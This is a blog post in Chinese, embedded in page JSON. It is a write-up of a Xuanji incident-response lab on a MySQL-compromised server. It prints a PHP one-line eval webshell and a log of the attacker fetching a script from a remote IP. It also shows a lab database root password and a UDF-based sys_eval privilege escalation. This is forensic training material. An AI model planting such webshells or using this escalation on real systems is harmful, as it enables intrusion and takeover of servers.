{"pageProps":{"postData":{"id":"玄机第二章 日志分析-mysql应急响应","contentHtml":"<h1>第二章 日志分析-mysql应急响应</h1>\n<ol>\n<li>\n<p>黑客第一次写入的<code>shell flag</code>{关键字符串}\n通过Mysql写入shell应该是写入<code>Webshell</code> ，那么我们要去网站目录找</p>\n<pre><code class=\"hljs language-bash\">root@xuanji:/var/www/html# grep -rE <span class=\"hljs-string\">'@eval'</span> ./\n./sh.php:1      2       &#x3C;?php @<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'a'</span>]);?>     4\n</code></pre>\n<p>查看以下<code>./sh.php</code></p>\n<pre><code class=\"hljs language-bash\">root@xuanji:/var/www/html# <span class=\"hljs-built_in\">cat</span> ./sh.php \n1       2       &#x3C;?php @<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'a'</span>]);?>     4\n//ccfda79e-7aa1-4275-bc26-a6189eb9a20b\n</code></pre>\n<p>那么第一个Flag就是</p>\n<pre><code class=\"hljs language-bash\">flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}\n</code></pre>\n</li>\n<li>\n<p>黑客反弹 shell 的ip，flag{ip}</p>\n<p>寻找数据库日志，发现只有<code>error.log</code></p>\n<pre><code class=\"hljs language-bash\">root@xuanji:/var/log/mysql# <span class=\"hljs-built_in\">ls</span> -al\ntotal 8\ndrwxr-s---. 1 mysql adm      23 Jul 31  2023 .\ndrwxrwxr-x. 1 root  syslog   46 Jul 31  2023 ..\n-rw-rw----. 1 mysql adm    6238 Mar 26 15:10 error.log\n</code></pre>\n<p>查看，可以在里面找到一个IP，<code>192.168.100.13</code></p>\n<pre><code class=\"hljs language-bash\">230731 10:14:49 [Note] /usr/sbin/mysqld: ready <span class=\"hljs-keyword\">for</span> connections.\nVersion: <span class=\"hljs-string\">'5.5.64-MariaDB-1ubuntu0.14.04.1'</span>  socket: <span class=\"hljs-string\">'/var/run/mysqld/mysqld.sock'</span>  port: 3306  (Ubuntu)\nsh: 1: curl: not found\n--2023-08-01 02:14:11--  http://192.168.100.13:771/\nConnecting to 192.168.100.13:771... connected.\nHTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9\nLength: unspecified\nSaving to: <span class=\"hljs-string\">'index.html'</span>\n\n     0K                                                        2.46 =2.0s\n\n2023-08-01 02:14:13 (2.46 B/s) - <span class=\"hljs-string\">'index.html'</span> saved [5]\n\n/tmp/1.sh: line 1: --2023-08-01: <span class=\"hljs-built_in\">command</span> not found\n</code></pre>\n<p>那么Flag就是</p>\n<pre><code class=\"hljs language-bash\">flag{192.168.100.13}\n</code></pre>\n</li>\n<li>\n<p>黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx</p>\n<p>假如我们是黑客，黑到了服务器是普通用户，然后需要提权，我们应该想会去找密码，例如数据库密码，并且假如数据库的用户是<code>root</code>并且<code>secure_file_priv</code> 为空，则就可以使用<code>UDF</code>提权</p>\n<p>先去找数据库账户密码，在<code>common.php</code>中可以找到</p>\n<pre><code class=\"hljs language-bash\">root@xuanji:/var/www/html# <span class=\"hljs-built_in\">cat</span> common.php \n&#x3C;?php\n<span class=\"hljs-variable\">$conn</span>=mysqli_connect(<span class=\"hljs-string\">\"localhost\"</span>,<span class=\"hljs-string\">\"root\"</span>,<span class=\"hljs-string\">\"334cc35b3c704593\"</span>,<span class=\"hljs-string\">\"cms\"</span>,<span class=\"hljs-string\">\"3306\"</span>);\n<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$conn</span>){\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"数据库连接失败\"</span>;\n}\n</code></pre>\n<p>登录数据库后，查看插件目录路径</p>\n<pre><code class=\"hljs language-bash\">MariaDB [(none)]> SHOW VARIABLES LIKE <span class=\"hljs-string\">\"secure_file_priv\"</span>;\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.00 sec)\n</code></pre>\n<p>是为空，则会有<code>UDF</code>提权，那么在<code>/usr/lib/mysql/plugin</code> 可能就会留下痕迹</p>\n<pre><code class=\"hljs language-bash\">root@xuanji:/tmp# <span class=\"hljs-built_in\">ls</span> -al /usr/lib/mysql/plugin/\ntotal 4752\ndrwxr-xr-x. 1 mysql mysql      39 Aug  1  2023 .\ndrwxr-xr-x. 1 root  root       20 Jul 31  2023 ..\n-rw-r--r--. 1 mysql mysql   10416 May 16  2019 auth_pam.so\n-rw-r--r--. 1 mysql mysql    6464 May 16  2019 auth_socket.so\n-rw-r--r--. 1 mysql mysql   10200 May 16  2019 dialog.so\n-rw-r--r--. 1 mysql mysql 1600136 May 16  2019 ha_innodb.so\n-rw-r--r--. 1 mysql mysql  159304 May 16  2019 handlersocket.so\n-rw-r--r--. 1 mysql mysql    6104 May 16  2019 mysql_clear_password.so\n-rw-rw-rw-. 1 mysql mysql   10754 Aug  1  2023 mysqludf.so\n-rw-r--r--. 1 mysql mysql   39944 May 16  2019 semisync_master.so\n-rw-r--r--. 1 mysql mysql   14736 May 16  2019 semisync_slave.so\n-rw-r--r--. 1 mysql mysql   55696 May 16  2019 server_audit.so\n-rw-r--r--. 1 mysql mysql 2918008 May 16  2019 sphinx.so\n-rw-r--r--. 1 mysql mysql   11008 May 16  2019 sql_errlog.so\n-rw-rw-rw-. 1 mysql mysql      34 Aug  1  2023 udf.so\n</code></pre>\n<p>很明显，<code>udf.so</code> 是提权的文件</p>\n<p>那么<code>Flag</code>就是</p>\n<pre><code class=\"hljs language-bash\">root@xuanji:/tmp# <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"/usr/lib/mysql/plugin/udf.so\"</span> | <span class=\"hljs-built_in\">md5sum</span>\nb1818bde4e310f3d23f1005185b973e7  -\n</code></pre>\n<pre><code class=\"hljs language-bash\">flag{b1818bde4e310f3d23f1005185b973e7}\n</code></pre>\n</li>\n<li>\n<p>黑客获取的权限 flag{whoami后的值}</p>\n<p>我们直接去找自定义函数</p>\n<pre><code class=\"hljs language-bash\">MariaDB [(none)]> <span class=\"hljs-keyword\">select</span> * from mysql.func;\n+----------+-----+-------------+----------+\n| name     | ret | dl          | <span class=\"hljs-built_in\">type</span>     |\n+----------+-----+-------------+----------+\n| sys_eval |   0 | mysqludf.so | <span class=\"hljs-keyword\">function</span> |\n+----------+-----+-------------+----------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.00 sec)\n</code></pre>\n<p>使用自定义函数执行<code>whoami</code></p>\n<pre><code class=\"hljs language-bash\">MariaDB [(none)]> <span class=\"hljs-keyword\">select</span> sys_eval(<span class=\"hljs-string\">'whoami'</span>);\n+--------------------+\n| sys_eval(<span class=\"hljs-string\">'whoami'</span>) |\n+--------------------+\n| mysql\n             |\n+--------------------+\n1 row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (0.00 sec)\n</code></pre>\n<pre><code class=\"hljs language-bash\">flag{mysql}\n</code></pre>\n</li>\n</ol>","title":"玄机 - 第二章 日志分析-mysql应急响应","date":"2025-04-04","updated":"2025-04-03","comments":true,"tags":["玄机","应急响应","日志分析"],"categories":"靶机","description":"第二章 日志分析-mysql应急响应\n\n1. 黑客第一次写入的`shell flag`{关键字符串} \n通过Mysql写入shell应该是写入`Webshell` ，那么我们要去网站目录找\n    \n    \n    \n    查看以下`./sh.php`\n    \n    \n    \n    那么第一个Flag就是\n    \n    \n    \n2. 黑客反弹 shell 的ip，flag{ip..."},"recentPosts":[{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"}]},"__N_SSG":true}